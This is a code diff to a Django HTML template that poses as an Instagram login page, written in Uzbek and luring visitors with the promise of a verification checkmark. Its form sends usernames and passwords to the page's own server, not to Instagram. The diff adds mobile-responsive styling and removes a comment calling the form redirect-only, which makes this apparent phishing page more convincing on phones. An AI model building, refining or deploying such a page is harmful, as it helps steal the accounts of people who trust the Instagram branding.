@@ -3,6 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <title>Instagramga Kirish</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1"> <!-- MUHIM -->
   <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
   <style>
     * {
@@ -14,15 +15,19 @@
       display: flex;
       justify-content: center;
       align-items: center;
-      height: 100vh;
+      min-height: 100vh;
       margin: 0;
+      padding: 20px;
     }
     .login-container {
-      width: 350px;
+      width: 100%;
+      max-width: 350px;
       background-color: #fff;
       border: 1px solid #dbdbdb;
-      padding: 40px;
+      padding: 40px 20px;
       text-align: center;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.05);
+      border-radius: 8px;
     }
     .logo {
       font-size: 36px;
@@ -43,7 +48,7 @@
       font-size: 16px;
     }
     .info {
-      font-size: 12px;
+      font-size: 13px;
       color: #8e8e8e;
       margin-top: 15px;
     }
@@ -56,6 +61,25 @@
       text-decoration: none;
       font-weight: bold;
     }
+
+    @media (max-width: 400px) {
+      .logo {
+        font-size: 28px;
+      }
+
+      button {
+        font-size: 14px;
+        padding: 8px;
+      }
+
+      .info {
+        font-size: 12px;
+      }
+
+      .footer {
+        font-size: 13px;
+      }
+    }
   </style>
 </head>
 <body>
@@ -64,13 +88,12 @@
     <div class="logo">Instagram</div>
     <div class="info">✅ Galichka olish uchun tizimga kiring</div>
     <p></p>
-    <!-- Bosh forma faqat yo'naltirish uchun -->
+
     <form method="post">
       {% csrf_token %}
       {{ form.as_p }}
       <button type="submit">Send</button>
     </form>
-
 
     <div class="footer">
       Hisobingiz yo‘qmi? <a href="https://www.instagram.com/accounts/emailsignup/">Ro‘yxatdan o‘tish</a>
